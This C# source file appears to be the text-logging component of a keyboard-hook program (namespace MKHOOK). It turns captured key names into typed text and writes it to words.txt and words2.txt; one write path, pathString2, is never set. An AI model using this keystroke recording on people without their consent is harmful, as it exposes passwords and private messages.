using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace MKHOOK
{
    public class WordsFile
    {
        private string pathString;
        private string pathString2;
        private Events events;
        private string words = "";
        string workingDirectory = Environment.CurrentDirectory;
        //private int specialCharacters = 0;

        public WordsFile(Events events)
        {
            this.events = events;
        }
        public void write(string newWords, bool newLine)
        {
                if (newWords == "Space")
                {
                    words = words + " ";
                }
                else if (newWords == "Back")
                {
                    if (words.Length != 0)
                        words = words.Remove(words.Length - 1, 1);
                }
                else if (newWords == "Return")
                {
                    words = words + "\r\n";
                    File.WriteAllText(workingDirectory +"/words2.txt", words);
            }
                else if (newWords == "Oem7" || newWords == "Oem1" || newWords == "OemQuestion")
                {
                }
                else if (newWords == "Oemtilde")
                {
                    words = words + "Ñ";
                }
                else if (newWords == "OemPeriod")
                {
                    words = words + "\r\n";
                    File.WriteAllText(pathString2, words);
            }
                else if (newWords.Length > 1)
                {
                    Console.WriteLine(newWords);
                }
                else if (newLine == true)
                {
                    File.WriteAllText(workingDirectory +"/words2.txt", words);
                }
                else
                {
                    words = words + newWords;
                }
            File.WriteAllText(workingDirectory +"/words.txt", words);
        }
    }
}
